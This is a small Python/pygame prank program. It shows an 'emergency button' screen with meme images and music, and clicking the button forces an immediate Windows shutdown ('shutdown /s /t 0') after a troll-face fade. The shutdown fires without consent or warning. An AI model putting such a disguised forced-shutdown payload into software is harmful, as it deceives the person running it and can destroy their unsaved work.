import pygame as pg
import sys
from pathlib import Path
from time import sleep
import os

ROOTH_PATH = Path(__file__).parent
pg.init()

def fade(screen, text_surface, image_surface, new_text):
    for alpha in range(255, 0, -10):
        screen.fill((255, 255, 255))
        text_surface.set_alpha(alpha)
        screen.blit(text_surface, ( WIDHT // 2 - text_surface.get_width() // 2, HEIGHT // 2 - text_surface.get_height() // 2))
        pg.display.flip()
        pg.time.delay(50)
        
    text_surface = font.render(new_text, True, (5, 10, 10))
    
    for alpha in range(0, 255, 10):
        screen.fill((0, 0, 0))
        text_surface.set_alpha(alpha)
        screen.blit(image_surface, ( WIDHT // 2 - image_surface.get_width() // 2, HEIGHT // 2 - image_surface.get_height() // 2))
        screen.blit(text_surface, (WIDHT // 2 - text_surface.get_width() // 2, HEIGHT // 2 - text_surface.get_height() // 2))
        pg.display.flip()
        pg.time.delay(50)
        

WIDHT = 800
HEIGHT = 600
WINDOW_SIZE = (WIDHT, HEIGHT)
window = pg.display.set_mode(WINDOW_SIZE)
pg.display.set_caption("BOTÃO DE EMERGÊNCIA!")
music_mp3 = (ROOTH_PATH / "DRAMA_SONG.mp3")
pg.mixer.music.load(music_mp3)
pg.mixer.music.play(-1)

image = pg.image.load(ROOTH_PATH / "troll_face.png")

image_surface = pg.Surface((image.get_width(), image.get_height()), pg.SRCALPHA)
image_surface.fill((255, 255, 255, 0))  # Define a transparência inicial para 0
image_surface.blit(image, (0, 0))

WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
RED = (255, 0, 0)
IMAGE = pg.image.load(ROOTH_PATH / "shiba_meme.png")

IMAGE_RECT = IMAGE.get_rect()
IMAGE_RECT_CENTER = (WIDHT // 2, HEIGHT //2) 

BALLOON_RADIUS = 50
BALLOON_COLOR = RED
BALLOON_POSITION = (WIDHT // 2, HEIGHT // 2)

font = pg.font.SysFont(None, 50)
current_text = "CLIQUE"

def draw_balloon():
    pg.draw.circle(window, BALLOON_COLOR, BALLOON_POSITION, BALLOON_RADIUS)

def clicado(mouse_pos):
    distance_squared = (mouse_pos[0] - BALLOON_POSITION[0]) ** 2 + (mouse_pos[1] - BALLOON_POSITION[1])**2
    return distance_squared <= BALLOON_RADIUS**2

while True:
    window.fill(WHITE)
    window.blit(IMAGE, IMAGE_RECT)
    
    button_rect = pg.Rect(WIDHT // 2 - 100, HEIGHT // 2 - 50, 200, 100)
    pg.draw.rect(window, (200, 200, 200), button_rect)
    
    text_surface = font.render(current_text, True, (0, 0, 0))
    text_rect = text_surface.get_rect(center=button_rect.center)
    window.blit(text_surface, text_rect)
    
    for event in pg.event.get():
        if event.type == pg.QUIT:
            pg.quit()
            sys.exit()
        
        elif event.type == pg.MOUSEBUTTONDOWN:
            mouse_pos = pg.mouse.get_pos()
            if button_rect.collidepoint(mouse_pos):
                fade(window, text_surface, image_surface, "CIA!")
                sleep(3)
                os.system('shutdown /s /t 0')
                break
    pg.display.flip()